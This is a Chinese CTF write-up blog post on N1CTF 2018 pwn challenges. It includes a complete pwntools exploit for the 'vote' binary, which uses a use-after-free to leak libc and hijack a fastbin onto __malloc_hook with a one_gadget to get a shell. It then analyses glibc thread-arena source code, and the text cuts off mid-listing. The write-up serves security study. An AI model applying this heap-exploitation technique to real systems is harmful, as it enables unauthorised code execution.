<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="P4nda" />



<meta name="description" content="Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道，并主要针对线程堆的分配流程和结构分析了一波，读了两天源码...">
<meta name="keywords" content="PWN,Linux">
<meta property="og:type" content="article">
<meta property="og:title" content="N1CTF 2018 &amp;&amp; 线程堆知识源代码分析">
<meta property="og:url" content="http://p4nda.top/2018/03/15/n1ctf2018/index.html">
<meta property="og:site_name" content="p4nda&#39;s blog">
<meta property="og:description" content="Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道，并主要针对线程堆的分配流程和结构分析了一波，读了两天源码...">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://p4nda.top/img/n1ctf2018/1-1.png">
<meta property="og:image" content="http://p4nda.top/img/n1ctf2018/1-2.png">
<meta property="og:image" content="http://p4nda.top/img/n1ctf2018/1-3.png">
<meta property="og:image" content="http://p4nda.top/img/n1ctf2018/1-4.png">
<meta property="og:image" content="http://p4nda.top/img/n1ctf2018/3.png">
<meta property="og:updated_time" content="2018-07-05T13:43:01.315Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="N1CTF 2018 &amp;&amp; 线程堆知识源代码分析">
<meta name="twitter:description" content="Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道，并主要针对线程堆的分配流程和结构分析了一波，读了两天源码...">
<meta name="twitter:image" content="http://p4nda.top/img/n1ctf2018/1-1.png">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="p4nda&#39;s blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/p4nda.jpeg">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>N1CTF 2018 &amp;&amp; 线程堆知识源代码分析 | p4nda&#39;s blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?11859a78d84a58f3a5bac3d2ec5ea89e";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/p4nda.jpeg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">P4nda</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:root@p4nda.xyz" title="Email"></a>
                            
                                <a class="fa 新浪微博" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
                            
                                <a class="fa GitHub" href="https://github.com/ret2p4nda" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa 知乎" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
                            
                                <a class="fa 博客园" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
                            
                                <a class="fa QQ" href="/381124487" title="QQ"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNABLE-TW/">PWNABLE.TW</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Questions/">Questions</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="http://0gur1.cc">0gur1</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://tacxingxing.com">Tac1t0rnX</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://veritas501.space/">Veritas501</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://p1umer.club/">p1umer</a>
                    
                      <a class="main-nav-link switch-friends-link" href="//p4nda.top/WooyunDrops/">Wooyun知识库</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">PWNer of Dubhe | PWN &amp; security | byr</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">P4nda</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/p4nda.jpeg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">P4nda</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:root@p4nda.xyz" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/ret2p4nda" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
                            
                                <a class="fa 博客园" target="_blank" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
                            
                                <a class="fa QQ" target="_blank" href="/381124487" title="QQ"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-n1ctf2018" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/03/15/n1ctf2018/" class="article-date">
      <time datetime="2018-03-15T13:40:25.000Z" itemprop="datePublished">2018-03-15</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      N1CTF 2018 &amp;&amp; 线程堆知识源代码分析
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道。</p>
<h1 id="vote"><a href="#vote" class="headerlink" title="vote"></a>vote</h1><p>一道比较常规套路的fastbin利用方法，主要涉及的知识是fastbin堆块的劫持。</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目是一个投票系统，主要包括5个函数：</p>
<p><img src="/img/n1ctf2018/1-1.png" alt=""></p>
<p>涉及的数据结构是投票者的票数和名字：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0             8                16                 ...</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| number      |     time       |   name  .........  | </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<p>这里的投票函数实现的很诡异，创建了一个新的线程，线程利用一个bss段上的变量传递线程参数，sleep 等待3s开始投票，出现一个问题，当在3s内有另外的投票时，会造成竞争条件，使第一人的票数投到第二人上。</p>
<p><img src="/img/n1ctf2018/1-2.png" alt=""></p>
<p><img src="/img/n1ctf2018/1-3.png" alt=""></p>
<p>说到诡异，这个取消函数就更诡异了，显然里面有一个UAF以及double free漏洞：</p>
<p><img src="/img/n1ctf2018/1-4.png" alt=""></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>利用UAF漏洞，首先申请一个超过global_max_fast的漏洞，这样在释放时，堆块会放到unsorted bin中，在unsorted bin的组织结构中，堆块的fd、bk指针会填充为main_arena+88这个地址，因而泄露了libc的地址。注意防止释放时被top块合并就好了。</p>
<h3 id="Fastbin劫持"><a href="#Fastbin劫持" class="headerlink" title="Fastbin劫持"></a>Fastbin劫持</h3><p>同样还是利用UAF漏洞，fastbin是一个单链表结构，当可以控制一个堆块的fd指针的时候基本就可以实现任意地址分配。</p>
<p>首先，分配两个<strong>大小为0x70</strong> 的堆块，并且顺序释放，这样在fastbin中会形成单链表结构，单链表的第二块指向第一块的堆头。</p>
<p>这里的一个比较新的点是，这题的数据结构无法直接修改fd指针，但是由于UAF漏洞，当对一个已释放用户投票时，仍然修改了堆块的fd指针，理论上可以指向任意位置。</p>
<p>这里我选择将fd指针指向原位置+0x20的地址，因为这个地方可以编辑（上一个用户的name字段），因而伪造一个堆块，就可以再将fastbin劫持到其他地方，选择将堆块劫持到 __malloc_hook - 0x23的位置，这个位置是非页对齐的，但是在分配地址时并不检测，而且在libc 2.23库中，此处存在多个libc地址，当非页对齐看时，此处就有一个0x7f，恰好可绕过fastbin的size检测，另外还有一个malloc_assert检测，非常恰巧的一个值。</p>
<p>当可以控制__malloc_hook，将其覆盖为one_gadget，就可以直接通过malloc新的堆块来得到shell了。</p>
<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time,base64</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./vote'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./vote'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p)#,'b*0x0400F6D'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'47.90.103.10'</span>,<span class="number">6000</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'0'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vote</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">	p.sendline(str(index))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancel</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">	p.sendline(str(index))	</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3e0</span>,<span class="string">'p4nda'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">555</span>,<span class="string">'p4nda'</span>) <span class="comment">#1</span></span><br><span class="line">cancel(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'count: '</span>)</span><br><span class="line">leak = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">libc.address = leak - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] '</span>, hex(leak)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0x71</span>)+p64(<span class="number">0x71</span>)+p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>) )<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#3</span></span><br><span class="line"><span class="comment">#add(555,'p4nda') #4</span></span><br><span class="line">cancel(<span class="number">2</span>)</span><br><span class="line">cancel(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">	vote(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4n'</span>+p64(libc.address + <span class="number">0xf0274</span>))<span class="comment">#0xf02a4))#6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x50</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216	execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a	execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0274	execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1117	execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<h1 id="null"><a href="#null" class="headerlink" title="null"></a>null</h1><p>涉及到线程堆块的分配，看了两天源代码，尽管出题人说是 <strong>a relatively easy task </strong>。 </p>
<p>还是记录一下线程堆块分配的姿势。</p>
<h1 id="线程堆块分配"><a href="#线程堆块分配" class="headerlink" title="线程堆块分配"></a>线程堆块分配</h1><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p><strong>分配区</strong> 个人理解分配区是分配内存必要的分配结构，分为主分配区和非主分配区，主分配区利用sbrk等函数分配，地址是连续的；非主分配区是不连续的，因此需要组织多个子堆块（sub-heap），对应到下面的数据结构，每一个分配区对应一个malloc_state，每一个子堆块对应一个_heap_info。分配区的数量是一定的，与操作系统位数和CPU核数有关</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores + 1.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores + 1.</span><br></pre></td></tr></table></figure>
<p><strong>锁</strong> 锁是一个普通的变量，需要使用特殊的函数加锁解锁，为了进程间进行同步，防止发生竞争条件。</p>
<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ol>
<li><p>_heap_info</p>
<p><strong>仅存在于线程堆块里</strong>的数据结构，主要是标记当前sub_heap的数据信息，在线程里可以存在多个。</p>
<p><strong>主要原因是</strong> ：一个程序（进程）中可以包含多个进程，而各个进程的地址空间是共享的，主要就造成了其地址冲突。当主线程要求使用sbrk函数来保证堆空间是连续的时，那子线程智能使用mmap来分配堆空间。这样一来，由于mmap分配的特点，导致了线程分配的堆块是以块为单位的，如果某线程需要的堆块多的话，进程空间是不足的，再次使用mmap来分配heap时，二者并不连续，所以需要这样的数据结构来标识该块的所属和一些内存信息。</p>
<p>该sub_heap数据结构是单链表形式保存的，其_heap_info保存了前一个sub_heap的位置。 </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>malloc_state</p>
<p>对于进程堆有一些了解的同学对这个数据结构会很熟悉，一个非常常见的结构体是保存在libc库bss段的main_arena，这是主线程堆是唯一的，所以为了方便，在libc中加入了一个全局变量，而这个数据结构的目的是为了组织堆空间，如fastbin、unsorted bin、top链表的组织等等。</p>
<p>每一个线程有<strong>唯一</strong> 的malloc_state数据结构，即thread arena。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="结构组织"><a href="#结构组织" class="headerlink" title="结构组织"></a>结构组织</h3><ol>
<li><p><strong>分配区的获取</strong></p>
<p>可以先从malloc的代码出发，一步一步寻找分配区的生成与线程获取。首先是__libc_malloc函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, 